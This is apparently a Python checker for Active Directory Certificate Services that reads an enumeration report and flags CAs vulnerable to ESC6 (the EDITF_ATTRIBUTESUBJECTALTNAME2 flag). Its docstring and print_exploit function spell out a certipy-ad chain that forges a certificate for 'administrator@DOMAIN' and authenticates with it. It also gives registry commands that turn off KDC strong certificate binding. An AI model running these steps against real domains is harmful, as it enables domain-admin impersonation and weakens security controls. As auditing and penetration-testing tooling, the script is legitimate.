#!/usr/bin/env python3
"""
esc6.py -- ESC6 vulnerability checker for oxs_cert JSON reports.
Usage: python3 esc6.py -f oxs_cert_XXXXXXXX.json

ESC6 -- CA Misconfiguration: EDITF_ATTRIBUTESUBJECTALTNAME2 (ALL must be true):

  1. The CA has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled in its registry.
     When this flag is set, the CA accepts a SAN value from the CSR request
     body itself -- bypassing the template-level CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
     requirement entirely.

  2. At least one non-admin principal can Enroll in ANY template that:
     - Has Client Authentication (or any authentication EKU), AND
     - Does NOT require manager approval (CT_FLAG_PEND_ALL_REQUESTS absent), AND
     - Is NOT a CA template and NOT a machine-type template.

     ESC6 does not require the template to have ENROLLEE_SUPPLIES_SUBJECT set.
     The flag at the CA level overrides the template setting.

  Note on StrongCertificateBindingEnforcement (KB5014754):
    Microsoft's patch (KB5014754, May 2022+) introduced certificate binding
    checks in PKINIT.  If the KDC's StrongCertificateBindingEnforcement
    registry value is >= 2 (Full Enforcement), Kerberos auth with an
    attacker-supplied SAN will be blocked.  ESC6 then requires an LDAP-based
    authentication path (certipy-ad auth -ldap-shell) to be useful.
    This checker reports the binding value alongside each finding.

  ACL unknown:
    If no Enroll-capable templates are found and ACL data is missing, the CA
    finding is flagged UNCERTAIN -- manual verification required.

  JSON fields consumed from scan_info:
    ca_editflags                      -- list of CA objects, each with:
      .name                           -- CA display name
      .edit_flags_raw                 -- raw DWORD value (int or hex string)
      .edit_flags_decoded             -- list of flag name strings (optional)
      .editf_attributesubjectaltname2 -- bool (optional, derived field)
    kdc_strong_certificate_binding    -- same schema as esc4.py

  JSON fields consumed from templates[]:
    parsed.is_ca
    parsed.is_machine_type
    parsed.requires_manager_approval
    parsed.eku_friendly
    parsed.eku_is_empty
    parsed.enrollment_flags_decoded
    parsed.validity_period
    parsed.acl_enrollment_aces       -- ACEs with Enroll / AutoEnroll rights
    raw.cn
    raw.displayName
    raw.msPKI-Template-Schema-Version
    raw.msPKI-Minimal-Key-Size

Exploitation flow (certipy-ad):
  Step 1 -- Discover:
             certipy-ad find -u USER@DOMAIN -p PASS -dc-ip <DC-IP> -stdout -vulnerable
  Step 2 -- Request certificate with privileged UPN as SAN:
             certipy-ad req -u USER@DOMAIN -p PASS -dc-ip <DC-IP> \\
                 -target <CA-HOST> -ca '<CA-NAME>' -template '<TEMPLATE>' \\
                 -upn 'administrator@DOMAIN'
  Step 3 -- Authenticate:
             certipy-ad auth -pfx administrator.pfx \\
                 -username administrator -domain DOMAIN -dc-ip <DC-IP>
  Step 4 (patched DCs) -- Use LDAP shell instead of PKINIT:
             certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell

Requires template_enumeration.py >= 1.4.1 with ESC6 fields in scan_info.
"""

import argparse
import json
import sys

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------

# Bit flag value for EDITF_ATTRIBUTESUBJECTALTNAME2 in the CA EditFlags DWORD.
EDITF_ATTRIBUTESUBJECTALTNAME2 = 0x00040000   # 262144

# EKU OIDs that allow authentication -- required for a template to be useful
# as an ESC6 vehicle.
AUTH_EKUS = {
    "1.3.6.1.5.5.7.3.2",    # Client Authentication
    "1.3.6.1.4.1.311.20.2.2",  # Smart Card Logon
    "1.3.6.1.5.2.3.4",      # PKINIT Client Authentication
}

ADMIN_SIDS = {
    "S-1-5-32-544",   # BUILTIN\Administrators
    "S-1-5-18",       # SYSTEM
}

ADMIN_SID_SUFFIXES = [
    "-512",   # Domain Admins
    "-519",   # Enterprise Admins
    "-516",   # Domain Controllers
]


# ---------------------------------------------------------------------------
# Args / load
# ---------------------------------------------------------------------------

def parse_args():
    p = argparse.ArgumentParser(
        description="ESC6 checker for oxs_cert JSON reports",
        formatter_class=argparse.RawTextHelpFormatter,
    )
    p.add_argument("-f", "--file", metavar="FILE", required=True,
                   help="Path to oxs_cert JSON report")
    p.add_argument("--skip-acl", action="store_true",
                   help="Skip ACL check on templates (flag CA finding regardless)")
    p.add_argument("--verbose-skip", action="store_true",
                   help="Print why each template was skipped as ESC6 vehicle")
    return p.parse_args()


def load_report(path):
    try:
        with open(path, "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        print(f"[!] File not found: {path}")
        sys.exit(1)
    except json.JSONDecodeError as e:
        print(f"[!] Invalid JSON: {e}")
        sys.exit(1)


# ---------------------------------------------------------------------------
# Helpers -- shared with esc4.py pattern
# ---------------------------------------------------------------------------

def is_admin_sid(sid):
    if sid in ADMIN_SIDS:
        return True
    return any(sid.endswith(s) for s in ADMIN_SID_SUFFIXES)


def _ace_rights(ace):
    """Return the set of right names from an ACE (new list or legacy string)."""
    rights_list = ace.get("rights")
    if rights_list and isinstance(rights_list, list):
        return set(rights_list)
    single = ace.get("right")
    if single:
        return {single}
    return set()


def _ace_has_enroll(ace):
    """True if the ACE carries an Enroll or AutoEnroll right."""
    rights = _ace_rights(ace)
    mask_str = ace.get("mask", "0x0")
    try:
        mask_int = int(mask_str, 16)
    except (ValueError, TypeError):
        mask_int = 0
    return (
        "Enroll"     in rights or
        "AutoEnroll" in rights or
        "GenericAll" in rights or
        (mask_int & 0x10000000) != 0 or   # GENERIC_ALL
        (mask_int & 0x100) != 0            # RIGHT_DS_CONTROL_ACCESS (Enroll)
    )


def has_non_admin_enroll(aces):
    """Returns (True, sid) if at least one non-admin has Enroll right.
    Deny ACEs are evaluated first, matching AD ACE evaluation order.
    """
    denied_sids = set()
    for ace in aces:
        if ace.get("type") != "Deny":
            continue
        if _ace_has_enroll(ace):
            denied_sids.add(ace.get("sid", ""))

    for ace in aces:
        if ace.get("type") != "Allow":
            continue
        sid = ace.get("sid", "")
        if is_admin_sid(sid) or sid in denied_sids:
            continue
        if _ace_has_enroll(ace):
            return True, sid

    return False, None


# ---------------------------------------------------------------------------
# ESC6 -- CA flag check
# ---------------------------------------------------------------------------

def _parse_edit_flags(ca_obj):
    """
    Return the integer EditFlags value from a CA object.

    Accepts:
      - edit_flags_raw as int
      - edit_flags_raw as hex string ("0x00040000")
      - editf_attributesubjectaltname2 bool (derived field, fallback)
    """
    raw = ca_obj.get("edit_flags_raw")
    if raw is not None:
        if isinstance(raw, int):
            return raw
        try:
            return int(str(raw), 16)
        except (ValueError, TypeError):
            pass

    # Fallback: derived bool field
    derived = ca_obj.get("editf_attributesubjectaltname2")
    if derived is True:
        return EDITF_ATTRIBUTESUBJECTALTNAME2
    if derived is False:
        return 0

    return None   # unknown


def check_ca_esc6(ca_obj):
    """
    Returns (vulnerable, flag_value, uncertain) for a single CA object.

      vulnerable  = True  -- EDITF_ATTRIBUTESUBJECTALTNAME2 is confirmed set
      flag_value  = int or None (raw EditFlags DWORD)
      uncertain   = True  -- flag data missing, cannot confirm either way
    """
    flag_value = _parse_edit_flags(ca_obj)

    if flag_value is None:
        return False, None, True   # data missing

    vulnerable = bool(flag_value & EDITF_ATTRIBUTESUBJECTALTNAME2)
    return vulnerable, flag_value, False


# ---------------------------------------------------------------------------
# ESC6 -- template vehicle check
# ---------------------------------------------------------------------------

def check_template_esc6_vehicle(template, skip_acl=False):
    """
    Determine whether a template can be used as an ESC6 exploitation vehicle.

    Returns (usable, reasons_failed, enroll_sid, acl_unknown)

      usable        = True  -- template is a confirmed ESC6 vehicle
      reasons_failed = list of strings explaining why it did not qualify
      enroll_sid    = SID of a non-admin principal that can Enroll (or None)
      acl_unknown   = True  -- ACL data missing, result is uncertain
    """
    parsed   = template.get("parsed", {})
    failed   = []
    acl_unknown = False
    enroll_sid  = None

    # Filter 1: CA templates are not user-enrollable vehicles.
    if parsed.get("is_ca", False):
        failed.append("CA template (is_ca=True)")
        return False, failed, None, False

    # Filter 2: Machine-type templates require machine credentials.
    if parsed.get("is_machine_type", False):
        failed.append("Machine-type template (is_machine_type=True)")
        return False, failed, None, False

    # Filter 3: Manager approval blocks immediate issuance.
    if parsed.get("requires_manager_approval", False):
        failed.append("Requires manager approval")
        return False, failed, None, False

    # Filter 4: Template must have an authentication EKU (or empty EKU = Any Purpose).
    eku_is_empty = parsed.get("eku_is_empty", False)
    ekus         = parsed.get("eku_friendly", [])
    eku_oids     = {e["oid"] for e in ekus if "oid" in e}

    if not eku_is_empty and not (eku_oids & AUTH_EKUS):
        failed.append(
            "No authentication EKU (Client Auth / Smart Card Logon / PKINIT)"
        )
        return False, failed, None, False

    # Filter 5: A non-admin principal must be able to Enroll.
    if not skip_acl:
        all_aces = parsed.get("acl_enrollment_aces", [])

        if all_aces:
            has_enroll, enroll_sid = has_non_admin_enroll(all_aces)
            if not has_enroll:
                failed.append("No non-admin principal has Enroll right on this template")
        else:
            acl_unknown = True

    usable = len(failed) == 0
    return usable, failed, enroll_sid, acl_unknown


# ---------------------------------------------------------------------------
# Output helpers
# ---------------------------------------------------------------------------

def _eku_str(template):
    parsed = template.get("parsed", {})
    ekus   = parsed.get("eku_friendly", [])
    if parsed.get("eku_is_empty", not ekus):
        return "none (Any Purpose -- empty EKU)"
    return ", ".join(e["name"] + " (" + e["oid"] + ")" for e in ekus)


def _strong_binding_label(val):
    if val is None:
        return None
    mapping = {
        0: "Disabled",
        1: "Compatibility mode",
        2: "Full Enforcement",
    }
    return mapping.get(int(val), f"Unknown ({val})")


def _infer_default_binding(os_name, os_version):
    """
    Infer the likely DEFAULT StrongCertificateBindingEnforcement value
    based on OS version when the registry key is absent.

    Returns (inferred_value, confidence, explanation).
    Mirrors esc4.py logic exactly.
    """
    os_name    = (os_name    or "").lower()
    os_version = (os_version or "").lower()

    if "2025" in os_name:
        return 2, "high", "Server 2025 default is 2 (Full Enforcement)"

    if "2022" in os_name or "20348" in os_version:
        return 1, "medium", (
            "Server 2022 default is 1 (Compatibility). "
            "May be 2 if KB5014754 + May 2025 patch applied."
        )

    if "2019" in os_name or "17763" in os_version:
        return 1, "medium", (
            "Server 2019 default is 1 (Compatibility). "
            "May be 2 if KB5014754 + May 2025 patch applied."
        )

    if "2016" in os_name or "14393" in os_version:
        return 0, "high", "Server 2016 default is 0 (Disabled)"

    return 0, "low", "Unknown OS -- cannot infer default reliably"


def _print_strong_binding(scan):
    """Print StrongCertificateBindingEnforcement status from scan_info.
    Identical structure to esc4.py._print_strong_binding.
    """
    sb      = scan.get("kdc_strong_certificate_binding", {})
    val     = sb.get("value")
    source  = sb.get("source", "not_collected")
    os_name = sb.get("os_name", sb.get("os_hint", ""))
    os_ver  = sb.get("os_version", "")
    dfl     = sb.get("dfl")

    print("[*] KDC StrongCertificateBindingEnforcement")

    if source == "not_collected":
        print("    Status  : Not collected -- re-run template_enumeration.py >= 1.4.1")
        print("    Manual  : reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("              /v StrongCertificateBindingEnforcement")
        return

    if val is None:
        print("    Value   : Cannot be read via LDAP (registry key)")
        if os_name:
            print(f"    OS      : {os_name}" + (f"  ({os_ver})" if os_ver else ""))
        if dfl is not None:
            print(f"    DFL     : {dfl}")

        inferred, confidence, explanation = _infer_default_binding(os_name, os_ver)
        label = {0: "Disabled", 1: "Compatibility mode", 2: "Full Enforcement"}.get(
            inferred, str(inferred)
        )
        print(f"    Inferred: {inferred} ({label})  [confidence: {confidence}]")
        print(f"    Reason  : {explanation}")

        if inferred == 0:
            print("    Impact  : [LIKELY VULNERABLE] ESC6 auth should succeed")
        elif inferred == 1:
            print("    Impact  : [POTENTIALLY VULNERABLE] auth may succeed -- verify manually")
        else:
            print("    Impact  : [LIKELY MITIGATED] PKINIT blocked -- use -ldap-shell")

        print()
        print("    Manual check on DC:")
        print("      reg query \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement")
        print()
        print("    To disable for lab (if needed):")
        print("      reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
        return

    val_int = int(val)
    label   = _strong_binding_label(val_int)

    if val_int == 0:
        status = "[VULNERABLE] Disabled -- ESC6 PKINIT auth will succeed"
    elif val_int == 1:
        status = "[POTENTIALLY VULNERABLE] Compatibility mode -- may succeed on unpatched DCs"
    else:
        status = "[MITIGATED] Full Enforcement -- use certipy-ad auth -ldap-shell"

    print(f"    Value   : {val_int} ({label})")
    if os_name:
        print(f"    OS      : {os_name}" + (f"  ({os_ver})" if os_ver else ""))
    if dfl is not None:
        print(f"    DFL     : {dfl}")
    print(f"    Status  : {status}")

    if val_int != 0:
        print()
        print("    Note    : PKINIT auth may be blocked. Try -ldap-shell:")
        print("      certipy-ad auth -pfx administrator.pfx -dc-ip <DC-IP> -ldap-shell")
        print("    To disable for lab:")
        print("      reg add \"HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc\"")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")


def print_ca_finding(ca_obj, flag_value, uncertain=False):
    name    = ca_obj.get("name", "N/A")
    dns     = ca_obj.get("dns_name", ca_obj.get("hostname", "N/A"))
    decoded = ca_obj.get("edit_flags_decoded", [])

    flag_hex = f"0x{flag_value:08X}" if flag_value is not None else "N/A"

    print(f"  CA Name      : {name}")
    print(f"  CA Host      : {dns}")
    print(f"  EditFlags    : {flag_hex}" +
          (f"  ({', '.join(decoded)})" if decoded else ""))
    print(f"  ESC6 Flag    : EDITF_ATTRIBUTESUBJECTALTNAME2" +
          (" [UNCERTAIN -- data missing]" if uncertain else " [SET]"))


def print_vehicle_finding(template, enroll_sid, acl_unknown=False):
    raw    = template.get("raw", {})
    parsed = template.get("parsed", {})

    cn           = raw.get("cn", "N/A")
    display_name = raw.get("displayName", "N/A")
    dn           = template.get("dn", "N/A")
    schema_ver   = raw.get("msPKI-Template-Schema-Version", "N/A")
    validity     = parsed.get("validity_period", "unknown")
    enroll_flags = parsed.get("enrollment_flags_decoded", [])
    key_size     = raw.get("msPKI-Minimal-Key-Size", "N/A")

    print(f"  Template     : {cn} ({display_name})")
    print(f"  DN           : {dn}")
    print(f"  Schema       : {schema_ver}  |  Validity: {validity}  |  Key: {key_size} bit")
    print(f"  EKU          : {_eku_str(template)}")
    print(f"  Enroll Flags : {', '.join(enroll_flags) if enroll_flags else 'none'}")
    print(f"  Enroll SID   : {enroll_sid or 'N/A'}" +
          (" [!] ACL data incomplete -- verify manually" if acl_unknown else ""))


def print_exploit(ca_name, template_cn, strong_binding_val=None):
    print("  Exploit (certipy-ad):")
    print(f"    Step 1 -- Discover:")
    print(f"             certipy-ad find -u USER@DOMAIN -p PASS -dc-ip <DC-IP> \\")
    print(f"                 -stdout -vulnerable")
    print(f"    Step 2 -- Request certificate with privileged UPN as SAN:")
    print(f"             certipy-ad req -u USER@DOMAIN -p PASS -dc-ip <DC-IP> \\")
    print(f"                 -target <CA-HOST> -ca '{ca_name}' -template '{template_cn}' \\")
    print(f"                 -upn 'administrator@DOMAIN'")
    print(f"    Step 3 -- Authenticate:")
    print(f"             certipy-ad auth -pfx administrator.pfx \\")
    print(f"                 -username administrator -domain DOMAIN -dc-ip <DC-IP>")
    print(f"    Step 4 (patched DC) -- Use LDAP shell if PKINIT is blocked:")
    print(f"             certipy-ad auth -pfx administrator.pfx \\")
    print(f"                 -dc-ip <DC-IP> -ldap-shell")
    print(f"    Step 5 -- Restore CA flag (lab cleanup):")
    print(f"             certutil -setreg CA\\PolicyModules\\")
    print(f"                 CertificateAuthority_MicrosoftDefault.Policy\\EditFlags")
    print(f"                 -EDITF_ATTRIBUTESUBJECTALTNAME2")
    print(f"             Restart-Service CertSvc")

    if strong_binding_val is None:
        print()
        print("  [!] StrongCertificateBindingEnforcement unknown.")
        print("      If PKINIT auth fails, try -ldap-shell or set to 0 on DC:")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
    elif int(strong_binding_val) == 0:
        print()
        print("  [+] StrongCertificateBindingEnforcement = 0 (Disabled) -- auth should succeed.")
    elif int(strong_binding_val) == 1:
        print()
        print("  [!] StrongCertificateBindingEnforcement = 1 (Compatibility mode).")
        print("      Auth may succeed on unpatched DCs. If it fails, use -ldap-shell or set to 0.")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")
    else:
        print()
        print(f"  [-] StrongCertificateBindingEnforcement = {strong_binding_val} (Full Enforcement).")
        print("      PKINIT auth WILL be blocked. Use -ldap-shell, or set to 0 first:")
        print("      reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Kdc")
        print("          /v StrongCertificateBindingEnforcement /t REG_DWORD /d 0 /f")
        print("      Restart-Service Kdc -Force")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def main():
    args   = parse_args()
    report = load_report(args.file)

    scan   = report.get("scan_info", {})
    domain = scan.get("domain", "N/A")
    dc_ip  = scan.get("dc_ip", "N/A")
    user   = scan.get("user", "N/A")

    print(f"[*] Report    : {report.get('report_id', 'N/A')}")
    print(f"[*] Domain    : {domain}")
    print(f"[*] DC IP     : {dc_ip}")
    print(f"[*] User      : {user}")
    print()

    _print_strong_binding(scan)
    print()

    sb      = scan.get("kdc_strong_certificate_binding", {})
    sb_val  = sb.get("value")
    sb_os   = sb.get("os_name", sb.get("os_hint", ""))
    sb_osv  = sb.get("os_version", "")

    if sb_val is None and (sb_os or sb_osv):
        sb_val_inferred, _, _ = _infer_default_binding(sb_os, sb_osv)
    else:
        sb_val_inferred = sb_val

    # -------------------------------------------------------------------------
    # Step 1 -- Check CA-level flag
    # -------------------------------------------------------------------------

    ca_list = scan.get("ca_editflags", [])

    # Support flat single-CA reports where the CA fields are directly in scan_info.
    if not ca_list and scan.get("edit_flags_raw") is not None:
        ca_list = [scan]

    vulnerable_cas  = []   # (ca_obj, flag_value)
    uncertain_cas   = []   # (ca_obj, flag_value)
    clean_cas       = []   # (ca_obj, flag_value)

    for ca_obj in ca_list:
        vuln, flag_value, uncertain = check_ca_esc6(ca_obj)
        if uncertain:
            uncertain_cas.append((ca_obj, flag_value))
        elif vuln:
            vulnerable_cas.append((ca_obj, flag_value))
        else:
            clean_cas.append((ca_obj, flag_value))

    if not ca_list:
        print("[?] No CA EditFlags data found in scan_info.ca_editflags.")
        print("    Re-run template_enumeration.py >= 1.4.1 with ESC6 support.")
        print("    Manual check on CA host:")
        print("      certutil -getreg CA\\PolicyModules\\")
        print("          CertificateAuthority_MicrosoftDefault.Policy\\EditFlags")
        print()
        ca_list_empty = True
    else:
        ca_list_empty = False

    # -------------------------------------------------------------------------
    # Step 2 -- Find enrollable templates (ESC6 vehicles)
    # -------------------------------------------------------------------------

    templates = report.get("templates", [])

    vehicles_confirmed = []   # (template, enroll_sid)
    vehicles_uncertain = []   # (template, enroll_sid)
    vehicles_skipped   = []   # (template, reasons)

    for t in templates:
        usable, reasons_failed, enroll_sid, acl_unknown = \
            check_template_esc6_vehicle(t, skip_acl=args.skip_acl)

        if usable:
            vehicles_confirmed.append((t, enroll_sid))
        elif acl_unknown and len(reasons_failed) == 0:
            vehicles_uncertain.append((t, enroll_sid))
        else:
            vehicles_skipped.append((t, reasons_failed))

    # -------------------------------------------------------------------------
    # Output -- Vulnerable CAs
    # -------------------------------------------------------------------------

    if vulnerable_cas:
        print(f"[!] ESC6 found -- {len(vulnerable_cas)} CA(s) have EDITF_ATTRIBUTESUBJECTALTNAME2 set\n")
        print("=" * 60)

        for i, (ca_obj, flag_value) in enumerate(vulnerable_cas, 1):
            ca_name = ca_obj.get("name", "UNKNOWN-CA")
            print(f"CA Finding {i} of {len(vulnerable_cas)}")
            print("-" * 60)
            print_ca_finding(ca_obj, flag_value, uncertain=False)
            print()

            # Print usable vehicle templates for this CA
            if vehicles_confirmed:
                print(f"  Enrollable vehicle templates ({len(vehicles_confirmed)}):")
                for t, esid in vehicles_confirmed:
                    cn = t.get("raw", {}).get("cn", "?")
                    print(f"    - {cn}  (enroll SID: {esid or 'N/A'})")
                print()
                # Use the first confirmed template for exploit output
                exploit_template_cn = vehicles_confirmed[0][0].get("raw", {}).get("cn", "?")
            elif vehicles_uncertain:
                print(f"  [?] No confirmed vehicle templates -- {len(vehicles_uncertain)} uncertain (ACL missing):")
                for t, _ in vehicles_uncertain:
                    print(f"    - {t.get('raw', {}).get('cn', '?')}")
                print()
                exploit_template_cn = vehicles_uncertain[0][0].get("raw", {}).get("cn", "?")
            else:
                print("  [-] No enrollable vehicle templates found.")
                print("      ESC6 CA flag is set but no usable template was identified.")
                print("      Verify template enrollment permissions manually.")
                print()
                exploit_template_cn = "<TEMPLATE>"

            print_exploit(ca_name, exploit_template_cn, strong_binding_val=sb_val_inferred)
            print("=" * 60)

    elif uncertain_cas:
        print(f"[?] {len(uncertain_cas)} CA(s) with unknown EditFlags -- manual verification required\n")
        print("=" * 60)
        for i, (ca_obj, flag_value) in enumerate(uncertain_cas, 1):
            print(f"CA Finding {i} of {len(uncertain_cas)}")
            print("-" * 60)
            print_ca_finding(ca_obj, flag_value, uncertain=True)
            print()
            print("  Manual check on CA host:")
            print("    certutil -getreg CA\\PolicyModules\\")
            print("        CertificateAuthority_MicrosoftDefault.Policy\\EditFlags")
            print("=" * 60)

    elif not ca_list_empty:
        print("[+] No ESC6 vulnerable CAs found (EDITF_ATTRIBUTESUBJECTALTNAME2 not set).")

    # -------------------------------------------------------------------------
    # Vehicle template detail (only printed when CA is vulnerable)
    # -------------------------------------------------------------------------

    if vulnerable_cas and vehicles_confirmed:
        print()
        print(f"[*] Enrollable vehicle template details ({len(vehicles_confirmed)} confirmed):\n")
        print("=" * 60)
        for i, (t, esid) in enumerate(vehicles_confirmed, 1):
            print(f"Vehicle {i} of {len(vehicles_confirmed)}")
            print("-" * 60)
            print_vehicle_finding(t, esid, acl_unknown=False)
            print("=" * 60)

    if vulnerable_cas and vehicles_uncertain:
        print()
        print(f"[?] Uncertain vehicle templates ({len(vehicles_uncertain)} -- ACL data missing):\n")
        print("=" * 60)
        for i, (t, esid) in enumerate(vehicles_uncertain, 1):
            print(f"Vehicle {i} of {len(vehicles_uncertain)}")
            print("-" * 60)
            print_vehicle_finding(t, esid, acl_unknown=True)
            print("=" * 60)

    # -------------------------------------------------------------------------
    # Verbose skip
    # -------------------------------------------------------------------------

    if args.verbose_skip and vehicles_skipped:
        print(f"\n[*] Templates that did not qualify as ESC6 vehicles ({len(vehicles_skipped)}):")
        for t, reasons in vehicles_skipped:
            cn = t.get("raw", {}).get("cn", "?")
            print(f"  - {cn}: {'; '.join(sorted(reasons))}")

    # -------------------------------------------------------------------------
    # Summary
    # -------------------------------------------------------------------------

    total_cas       = len(ca_list)
    vuln_ca_count   = len(vulnerable_cas)
    uncertain_count = len(uncertain_cas)
    clean_ca_count  = len(clean_cas)

    print()
    print(
        f"[*] {total_cas} CA(s) checked  |  "
        f"{vuln_ca_count} vulnerable  |  "
        f"{uncertain_count} uncertain  |  "
        f"{clean_ca_count} clean"
    )
    print(
        f"[*] {len(templates)} template(s) checked  |  "
        f"{len(vehicles_confirmed)} confirmed vehicles  |  "
        f"{len(vehicles_uncertain)} uncertain  |  "
        f"{len(vehicles_skipped)} not usable"
    )


if __name__ == "__main__":
    main()